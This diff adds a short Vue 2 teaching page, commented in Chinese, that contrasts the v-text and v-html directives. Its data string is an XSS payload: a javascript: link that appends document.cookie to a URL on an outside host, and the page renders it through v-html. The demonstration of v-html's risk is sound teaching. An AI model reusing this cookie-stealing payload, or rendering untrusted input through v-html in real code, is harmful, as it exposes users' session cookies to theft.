@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8" />
+        <title>v-html 指令</title>
+        <!-- 引入 Vue -->
+        <script type="text/javascript" src="../js/vue.js"></script>
+        <style>
+            [v-clock]{
+                display:none;
+            }
+        </style>
+    </head>
+    <body>
+        <div v-clock id="root">
+            <div>你好啊，{{name}}</div>
+            <div v-text="name"></div>
+            v-text:<div v-text="str"> </div>
+            v-html:<div v-html="str"></div>
+        </div>
+        <script type="text/javascript">
+            Vue.config.productionTip = false 
+            // 创建 Vue 实例 
+            new Vue({
+                el:'#root',
+                data:{
+                    name:'花生壳',
+                    str:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>Cookie<a>'
+                }
+            })
+        </script>
+    </body>
+</html>
+
